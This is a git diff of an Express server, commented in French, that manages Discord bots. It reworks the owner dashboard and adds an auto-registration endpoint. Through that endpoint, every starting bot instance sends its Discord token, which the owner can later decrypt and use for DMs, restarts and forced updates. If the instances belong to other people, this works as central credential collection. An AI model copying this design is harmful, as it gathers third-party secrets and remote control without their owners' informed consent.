@@ -227,15 +227,36 @@ app.get("/", async (req, res) => {
   });
 });
 
-/* ===================== DASHBOARD (OWNER) ===================== */
+/* ===================== DASHBOARD (OWNER) — page unique à onglets ===================== */
 app.get("/dashboard", requireOwner, async (req, res) => {
   const stats = await getStatsDoc();
   const releases = await Release.find().sort({ createdAt: -1 });
   const latest = releases[0]?.version || "v1.0";
   const bots = Object.values(stats.bots || {}).filter(Boolean);
 
+  // --- Bots connectés (fusion de l'ancienne page /owner/status) ---
+  const liveBots = await getConnectedBots();
+  const registered = await Bot.find().sort({ createdAt: -1 }).lean();
+  const liveByDiscordId = new Map(liveBots.map((b) => [b.botId, b]));
+  const registeredDiscordIds = new Set(
+    registered.map((b) => b.discordBotId).filter(Boolean)
+  );
+  const registeredBots = registered.map((b) => ({
+    ...b,
+    live: b.discordBotId ? liveByDiscordId.get(b.discordBotId) || null : null,
+  }));
+  const unregisteredLive = liveBots.filter((b) => !registeredDiscordIds.has(b.botId));
+
+  // --- Corbeille ---
+  const trashItems = await Trash.find().sort({ deletedAt: -1 }).lean();
+
+  const tab = ["home", "bots", "update", "trash"].includes(req.query.tab)
+    ? req.query.tab
+    : "home";
+
   res.render("dashboard", {
     user: req.user,
+    tab,
     latest,
     releases,
     stats,
@@ -246,6 +267,9 @@ app.get("/dashboard", requireOwner, async (req, res) => {
         0,
         bots.length - bots.filter((b) => b.botVersion === latest).length
       ) || 0,
+    registeredBots,
+    unregisteredLive,
+    trashItems,
     support: SUPPORT_LINK,
   });
 });
@@ -311,7 +335,7 @@ app.post("/upload", requireOwner, (req, res) => {
       }
     }
 
-    res.redirect("/dashboard");
+    res.redirect("/dashboard?tab=update");
   });
 });
 
@@ -359,7 +383,7 @@ app.post("/delete/:version", requireOwner, async (req, res) => {
   await Release.deleteOne({ version });
 
   console.log(`🗑️ Version envoyée à la corbeille : ${version}`);
-  res.redirect("/dashboard");
+  res.redirect("/dashboard?tab=update");
 });
 
 // Revenir sur une version : on change juste son createdAt pour la repasser en "dernière"
@@ -373,18 +397,11 @@ app.post("/revert/:version", requireOwner, async (req, res) => {
   await r.save();
 
   console.log(`🔁 Version revert : ${version}`);
-  res.redirect("/dashboard");
+  res.redirect("/dashboard?tab=update");
 });
 
-// Page corbeille
-app.get("/trash", requireOwner, async (req, res) => {
-  const items = await Trash.find().sort({ deletedAt: -1 }).lean();
-  res.render("trash", {
-    user: req.user,
-    items,
-    support: SUPPORT_LINK,
-  });
-});
+// Ancienne page corbeille -> onglet unique
+app.get("/trash", requireOwner, (req, res) => res.redirect("/dashboard?tab=trash"));
 
 // Restaurer une release depuis la corbeille
 app.post("/trash/restore/:id", requireOwner, async (req, res) => {
@@ -407,7 +424,7 @@ app.post("/trash/restore/:id", requireOwner, async (req, res) => {
   await Trash.deleteOne({ _id: id });
 
   console.log(`♻️ Version restaurée depuis la corbeille : ${item.version}`);
-  res.redirect("/trash");
+  res.redirect("/dashboard?tab=trash");
 });
 
 // Suppression définitive + suppression du ZIP si présent
@@ -424,7 +441,7 @@ app.post("/trash/delete/:id", requireOwner, async (req, res) => {
 
   await Trash.deleteOne({ _id: id });
 
-  res.redirect("/trash");
+  res.redirect("/dashboard?tab=trash");
 });
 
 /* ===================== BOTS CONNECTÉS (live status) ===================== */
@@ -448,38 +465,9 @@ async function getConnectedBots() {
     .sort((a, b) => Number(b.online) - Number(a.online));
 }
 
-// Page web unifiée : statut en direct + gestion complète des bots (ex "Mes bots", fusionnée ici)
-app.get("/owner/status", requireOwner, async (req, res) => {
-  const liveBots = await getConnectedBots();
-  const registered = await Bot.find().sort({ createdAt: -1 }).lean();
-  const latest = await Release.findOne().sort({ createdAt: -1 });
-  const latestVersion = latest?.version || "v1.0";
-
-  const liveByDiscordId = new Map(liveBots.map((b) => [b.botId, b]));
-  const registeredDiscordIds = new Set(
-    registered.map((b) => b.discordBotId).filter(Boolean)
-  );
-
-  // Fiches enregistrées (avec token/propriétaire), enrichies du signal en direct si dispo
-  const bots = registered.map((b) => ({
-    ...b,
-    live: b.discordBotId ? liveByDiscordId.get(b.discordBotId) || null : null,
-  }));
-
-  // Instances qui pingent le manager mais n'ont pas encore de fiche (pas de token/propriétaire enregistré)
-  const unregisteredLive = liveBots.filter((b) => !registeredDiscordIds.has(b.botId));
-
-  res.render("owner_status", {
-    user: req.user,
-    bots,
-    unregisteredLive,
-    latestVersion,
-    support: SUPPORT_LINK,
-  });
-});
-
-// Ancienne page "Mes bots" fusionnée dans /owner/status
-app.get("/owner/bots", requireOwner, (req, res) => res.redirect("/owner/status"));
+// Ancienne page "Bots connectés" -> onglet unique du dashboard
+app.get("/owner/status", requireOwner, (req, res) => res.redirect("/dashboard?tab=bots"));
+app.get("/owner/bots", requireOwner, (req, res) => res.redirect("/dashboard?tab=bots"));
 
 // API JSON (le bot Discord l'appelle avec le header x-api-key)
 app.get("/api/status", requireApiKey, async (req, res) => {
@@ -487,23 +475,35 @@ app.get("/api/status", requireApiKey, async (req, res) => {
   res.json({ bots });
 });
 
-/* ===================== OWNER : GESTION DES BOTS (fiches + actions à distance) ===================== */
-app.post("/owner/bots/add", requireOwner, async (req, res) => {
-  const { name, ownerId, discordBotId, tokenPlain, notes } = req.body;
-  if (!name || !tokenPlain) return res.status(400).send("Nom et token requis.");
+/* ===================== AUTO-ENREGISTREMENT (appelé PAR le bot, pas par l'owner) =====================
+   Le bot s'enregistre lui-même dès son démarrage (voir source/events/manager/connection.js côté bot).
+   Il n'y a donc plus d'ajout manuel depuis le site : dès qu'une instance démarre avec un token valide
+   dans son config.js, elle apparaît ici et est immédiatement pilotable. */
+app.post("/api/bots/register", requireApiKey, async (req, res) => {
+  const { discordBotId, tag, token, ownerId, name, notes } = req.body || {};
+  if (!discordBotId || !token) {
+    return res.status(400).json({ error: "discordBotId et token requis." });
+  }
 
-  await Bot.create({
-    name,
-    ownerId: ownerId || req.user.id,
-    discordBotId: (discordBotId || "").trim() || null,
-    token: encrypt(tokenPlain),
-    meta: { notes: notes || "" },
-    stats: { restarts: 0, errors: 0 },
-  });
+  const update = {
+    name: name || tag || discordBotId,
+    discordBotId,
+    token: encrypt(token),
+  };
+  if (ownerId) update.ownerId = ownerId;
+  if (notes) update.meta = { notes };
 
-  res.redirect("/owner/status");
+  const bot = await Bot.findOneAndUpdate(
+    { discordBotId },
+    { $set: update, $setOnInsert: { stats: { restarts: 0, errors: 0 } } },
+    { upsert: true, new: true, setDefaultsOnInsert: true }
+  );
+
+  console.log(`🔗 Bot auto-enregistré : ${bot.name} (${discordBotId})`);
+  res.json({ ok: true, id: bot._id });
 });
 
+/* ===================== OWNER : GESTION DES BOTS (fiches + actions à distance) ===================== */
 app.post("/owner/bots/:id/delete", requireOwner, async (req, res) => {
   const { id } = req.params;
   const bot = await Bot.findById(id);
@@ -513,7 +513,7 @@ app.post("/owner/bots/:id/delete", requireOwner, async (req, res) => {
   await Report.deleteMany({ botId: id });
 
   console.log(`🗑️ Bot supprimé : ${bot.name}`);
-  res.redirect("/owner/status");
+  res.redirect("/dashboard?tab=bots");
 });
 
 app.get("/owner/bots/:id/decrypt", requireOwner, async (req, res) => {
@@ -542,7 +542,7 @@ app.post("/owner/bots/:id/restart", requireOwner, async (req, res) => {
   await bot.save();
 
   console.log(`🔁 Redémarrage demandé pour : ${bot.name}`);
-  res.redirect("/owner/status");
+  res.redirect("/dashboard?tab=bots");
 });
 
 // Mise à jour forcée à distance : même principe que le restart, la commande "update"
@@ -560,7 +560,7 @@ app.post("/owner/bots/:id/force-update", requireOwner, async (req, res) => {
   await bot.save();
 
   console.log(`⬆️ Mise à jour forcée demandée pour : ${bot.name}`);
-  res.redirect("/owner/status");
+  res.redirect("/dashboard?tab=bots");
 });
 
 // Message privé envoyé PAR le bot À son propriétaire (utilise le token du bot, envoi immédiat)
@@ -576,7 +576,7 @@ app.post("/owner/bots/:id/message", requireOwner, async (req, res) => {
     const token = decrypt(bot.token);
     await sendDiscordDM(token, bot.ownerId, message);
     console.log(`✉️ Message privé envoyé par ${bot.name} à ${bot.ownerId}`);
-    res.redirect("/owner/status");
+    res.redirect("/dashboard?tab=bots");
   } catch (e) {
     console.error("❌ Erreur envoi DM :", e.message);
     res.status(500).send("Erreur lors de l'envoi du message : " + e.message);
@@ -602,6 +602,34 @@ app.post("/api/report", async (req, res) => {
   }
 
   res.json({ ok: true });
+});
+
+// Poll côté navigateur (dashboard) pour afficher les popups de mise à jour/redémarrage
+app.get("/api/reports/recent", requireOwner, async (req, res) => {
+  const sinceId = req.query.sinceId;
+  const query = {};
+  if (sinceId && /^[a-f0-9]{24}$/i.test(sinceId)) {
+    query._id = { $gt: sinceId };
+  } else {
+    query.createdAt = { $gte: new Date(Date.now() - 60 * 1000) };
+  }
+
+  const reports = await Report.find(query).sort({ createdAt: 1 }).limit(50).lean();
+  const botIds = [...new Set(reports.map((r) => String(r.botId || "")))].filter(Boolean);
+  const botsById = new Map(
+    (await Bot.find({ _id: { $in: botIds } }).select("name").lean()).map((b) => [String(b._id), b.name])
+  );
+
+  res.json({
+    reports: reports.map((r) => ({
+      id: r._id,
+      botId: r.botId,
+      botName: botsById.get(String(r.botId)) || "Bot",
+      type: r.type,
+      payload: r.payload || {},
+      createdAt: r.createdAt,
+    })),
+  });
 });
 
 async function upsertBotStatus(stats, botId, botVersion, tag, startedAtRaw) {
@@ -664,10 +692,10 @@ app.get("/api/version", async (req, res) => {
       latest.filename
     )}`;
 
-  // 🔧 Met à jour aussi les stats du Bot s'il existe (pour le dashboard "Mes bots")
+  // 🔧 Met à jour aussi les stats du Bot s'il existe (pour l'onglet "Bots connectés")
   if (botId && botId !== "unknown") {
     try {
-      const b = await Bot.findById(botId);
+      const b = await Bot.findOne({ discordBotId: botId });
       if (b) {
         const s = b.stats || {};
         s.botVersion = botVersion;
